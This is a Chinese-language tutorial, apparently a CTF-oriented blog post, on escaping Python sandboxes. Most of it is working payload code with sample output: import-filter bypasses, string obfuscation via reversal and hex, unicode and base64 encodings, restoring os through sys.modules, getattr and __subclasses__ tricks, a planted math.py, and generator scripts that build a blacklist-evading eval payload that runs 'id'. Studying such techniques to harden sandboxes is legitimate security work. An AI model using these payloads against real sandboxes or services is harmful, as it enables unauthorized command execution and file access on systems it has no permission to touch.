的沙箱逃逸的最终目标就是执行系统任意命令，次一点的写文件，再次一点的读文件。
### 执行系统命令：
### import绕过：
首先，禁用 `import os` 肯定是不行的，因为:
    import  os
    import   os
    import    os
如果多个空格也过滤了，Python 能够 import 的可不止 `import`：
    __import__：__import__('os')
    importlib：importlib.import_module('os').system('ls')
其实import 的原理，本质上就是执行一遍导入的库。这个过程实际上可以用 `execfile` 来代替，只适用于python2版本：
    execfile('/usr/lib/python2.7/os.py')
    system('ls')
python2和python3兼容方法：
    with open('/usr/lib/python3.6/os.py','r') as f:
        exec(f.read())
    system('ls')
不过使用上面的这两种方法，就必须知道==库的路径==。其实在大多数的环境下，库都是默认路径。如果 sys 没被干掉的话，还可以确认一下，：
    import sys
    print(sys.path)
### 字符串绕过：
代码中如果出现 `os`被过滤：那么可以利用字符串的各种变化来引入 os：
    __import__('so'[::-1]).system('ls')
    b = 'o'
    a = 's'
    __import__(a+b).system('ls')
还可以利用 `eval` 或者 `exec`：
    eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])
    #macr0phag3
    0
    exec(')"imaohw"(metsys.so ;so tropmi'[::-1])
    #macr0phag3
一串连等：
    ['__builtins__'] == 
    ['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f'] == 
    [u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f'] == 
    ['X19idWlsdGluc19f'.decode('base64')] == 
    ['__buil'+'tins__'] == 
    ['__buil''tins__'] == 
    ['__buil'.__add__('tins__')] == 
    ["_builtins_".join("__")] == 
    ['%c%c%c%c%c%c%c%c%c%c%c%c' % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]
最后一个有点通杀的感觉。
### 恢复 sys.modules：
  * `sys.modules` 是一个字典，里面储存了加载过的模块信息。
  * 如果 Python 是刚启动的话，所列出的模块就是解释器在启动时自动加载的模块。
  * 有些库例如 `os` 是默认被加载进来的，但是不能直接使用（但是可以通过 `sys.modules` 来使用，例如 `sys.modules["os"]`），原因在于 sys.modules 中未经 import 加载的模块对当前空间是不可见的。
  * 如果将 os 从 sys.modules 中剔除，os 就彻底没法用了：
    >>> sys.modules['os'] = 'not allowed'
    >>> import os
    >>> os.system('ls')
    Traceback (most recent call last):
      File "", line 1, in 
    AttributeError: 'str' object has no attribute 'system'
    >>>
  * 注意，这里不能用 `del sys.modules['os']`，因为，当 import 一个模块时：import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A 创建 module 对象，并加载 A。
  * 所以删了 `sys.modules['os']` 只会让 Python 重新加载一次 os。
  * 对于上面的过滤方式，绕过的方式可以是这样：
    sys.modules['os'] = 'not allowed' 
    del sys.modules['os']
    import os
    os.system('ls')
### 执行函数
通过上面内容我们很容易发现，光引入 os 只不过是第一步，如果把 system
这个函数干掉，也没法通过`os.system`执行系统命令，并且这里的`system`也不是字符串，也没法直接
做编码等等操作。我遇到过一个环境，直接在`/usr/lib/python2.7/os.py`中删了`system`函数。。。
不过，要明确的是，os 中能够执行系统命令的函数有很多：
    print(os.system('whoami'))
    print(os.popen('whoami').read()) 
    print(os.popen2('whoami').read()) # 2.x
    print(os.popen3('whoami').read()) # 2.x
    print(os.popen4('whoami').read()) # 2.x
其次，可以通过 `getattr` 拿到对象的方法、属性：
    import os
    getattr(os, 'metsys'[::-1])('whoami')
    >>> getattr(getattr(__builtins__, '__tropmi__'[::-1])('so'[::-1]), 'metsys'[::-1])('whoami')
    macr0phag3
与 `getattr` 相似的还有
`__getattr__`、`__getattribute__`，它们自己的区别就是`getattr`相当于`class.attr`，都是获取类属性/方法的一种方式，在获取的时候会触发`__getattribute__`，如果`__getattribute__`找不到，则触发`__getattr__`，还找不到则报错。
### builtins、`__builtin__`与`__builtins__`
先说一下，`builtin`、`builtins`，`__builtin__`与`__builtins__`的区别：  
首先我们知道，在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如`chr`、`open`。之所以可以这样，是因为 Python
有个叫`内建模块`（或者叫内建命名空间）的东西，它有一些常用函数，变量和类.
在 2.x 版本中，内建模块被命名为 `__builtin__`，到了 3.x 就成了 `builtins`。它们都需要 import 才能查看：  
2.x：
    >>> import __builtin__
    >>> __builtin__
3.x：
    >>> import builtins
    >>> builtins
但是，`__builtins__` 两者都有，实际上是`__builtin__`和`builtins` 的引用。它不需要导入，并且在
`__builtins__`里有很多好东西：
    >>> '__import__' in dir(__builtins__)
    True
    >>> __builtins__.__dict__['__import__']('os').system('whoami')
    macr0phag3
    0
    >>> 'eval' in dir(__builtins__)
    True
    >>> 'execfile' in dir(__builtins__)
    True
### 文件读写
2.x 有个内建的 `file`：
    >>> file('key').read()
    'Macr0phag3\n'
    >>> file('key', 'w').write('Macr0phag3')
    >>> file('key').read()
    'Macr0phag3'
还有个 `open`，2.x 与 3.x 通用。
还有一些库，例如：`types.FileType`(rw)、`platform.popen`(rw)、`linecache.getlines`(r)。
如果可以读取文件，可以将类似的文件保存为`math.py`，然后 import 进来：  
math.py：
    import os
    print(os.system('whoami'))
调用
    >>> import math
    macr0phag3
    这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在`sys.modules`中有的，这些库无法这样利用，会直接从`sys.modules`中加入，比如`re`：
    >>> 're' in sys.modules
    True
    >>> 'math' in sys.modules
    False
    >>>
当然在`import re` 之前`del sys.modules['re']`也可以
最后，这里的文件命名需要注意的地方和最开始的那个遍历测试的文件一样：由于待测试的库中有个叫 `test`的，如果把遍历测试的文件也命名为
test，会导致那个文件运行 2 次，因为自己 import 了自己。
读文件暂时没什么发现特别的地方。
剩下的就是根据上面的执行系统命令采用的绕过方法去寻找 payload 了，比如：
    >>> __builtins__.open('key').read()
    'Macr0phag3\n'
    >>> ().__class__.__base__.__subclasses__()[40]('key').read()
    'Macr0phag3'
### 沙箱通解：
    all(
       black_char not in CMD
       for blackl_char in (
         list("'\".,+") + [ "__", "exec", "str" , "import" ]
       )
    )
    ##这段代码检查CMD中是否包含特殊字符，如单引号、双引号、句号、加号，以及特殊字符"__"、"exec"、"str"和"import"。如果CMD中不包含这些特殊字符，则返回True，否则返回False。
    eval(CMD)
    #run `id` in os shell
    构造出一个 CMD，这个 CMD 经过这个 all 的计算后结果必须为 True，且 eval(CMD) 需要可以在 os shell 里执行 id
  * 从执行上下文看，我们要构造出的 `CMD` 显然是一个字符串，因为下面会进行 `eval`。那么这里就有第一个问题：如何构造出任意字符串？
  * 因为上面的限制条件把 `"`、`'` 都干掉了，所以直觉上我们会选择用 `chr` \+ `+` 来拼接出字符串，但是 `+` 也被干掉了。
  * 而由于 `,` 也被干掉了，所以虽然能调用函数，但是也只能传一个参数。并且 `.` 也被限制掉了，所以就算可以 `__import__` 也没法调用方法。
所以需要寻找其他办法。在内置的函数中发现了 `bytes()`：  
"""  
bytes(iterable_of_ints) -> bytes  
bytes(string, encoding[, errors]) -> bytes  
bytes(bytes_or_buffer) -> immutable copy of bytes_or_buffer  
bytes(int) -> bytes object of size given by the parameter initialized with
null bytes  
bytes() -> empty bytes object
    Construct an immutable of bytes from:
              - an iterable yielding integers in range(256)
              - a text string encoded using the specified encoding
              - any object implementing the buffer API.
              - an integer
            # (copied from class doc)
"""
1.定义空的字节序列bytes  
bytes() -> empty bytes  
2.定义指定个数的字节序列bytes，默认以0填充，不能是浮点数  
bytes(int) -> bytes of size given by the parameter initialized with null bytes  
3.定义指定内容的字节序列bytes  
bytes(iterable_of_ints)  
4.定义字节序列bytes，如果包含中文的时候必须设置编码格式  
bytes(string, encoding[, errors]) -> immutable copy of bytes_or_buffer  
返回值 ： 返回一个新的字节序列，字节序列 bytes 有一个明显的特征，输出的时候最前面会有一个字符 b 标识，
也就是说，这个函数可以接收一个可迭代对象，里面是 0-256 的整数，然后就会返回一个 bytes：  
由于 `range()` 是固定顺序的，无法得到我们要的任意字符串。那么接下来问题就变成了：如何构造包含任意序列的整数的可迭代对象？
对应的构造脚本：
    exp = '__import__("os").system("id")'
    print(f"eval(bytes([j for i in range({len(exp)}) for j in range(256) if "+" or ".join([f"i=={i} and j=={ord(j)}" for i, j in enumerate(exp)]) + "]))")
还有一个空格的限制，用 `[]` 来替代。构造脚本：
    exp = '__import__("os").system("id")'
    print(f"eval(bytes([[j][0]for(i)in[range({len(exp)})][0]for(j)in[range(256)][0]if["+"]or[".join([f"i]==[{i}]and[j]==[{ord(j)}" for i, j in enumerate(exp)]) + "]]))")
如果额外限制了 `==`，那么还可以用 `in` 来代替：
    exp = '__import__("os").system("id")'
    print(f"eval(bytes([[j][0]for(i)in[range({len(exp)})][0]for(j)in[range(256)][0]if["+"]]or[".join([f"i]in[[{i}]]and[j]in[[{ord(j)}" for i, j in enumerate(exp)]) + "]]]))")
  * 如果 `bytes` 之类的内置函数被禁用了，可以通过 Unicode 来绕过，这个技巧我们已经见得多了，就不多说了。
  * 所以，这个 payload 在大多数情况下已经可以通用了。
tr0y师傅的文章写的真的好，还有一些深奥的东西没有明白，感兴趣的师傅可以去他博客学习一波
参考文章：  